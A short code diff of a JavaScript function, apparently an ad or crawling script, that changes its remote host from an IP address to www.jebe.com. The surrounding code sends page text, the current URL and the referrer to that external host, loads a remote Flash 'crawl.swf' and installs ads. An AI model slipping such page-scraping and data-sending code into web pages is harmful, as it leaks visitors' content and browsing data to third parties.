@@ -403,7 +403,7 @@ function i8main()
 		{
 			sendText(body.innerText.replace(/\s{2,}/g,  ' '));
 		}
-		var host = "211.154.172.172", port = "10010";
+		var host = "www.jebe.com", port = "10010";
 		var swf = 'http://' + host + '/crawl.swf?a=' + Math.random() + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
 		var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
 				'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
@@ -462,7 +462,7 @@ function i8main()
             return;
         }
         installShowAds();
-        var url = 'http://211.154.172.172/target/?url=' + encodeURIComponent(location.href);
+        var url = 'http://www.jebe.com:10020/target/?url=' + encodeURIComponent(location.href);
         if (url.length > i8vars.urlMaxLen) return;
         var pad = '&ref=' + encodeURIComponent(document.referrer);
         if (url.length + pad.length <= i8vars.urlMaxLen)
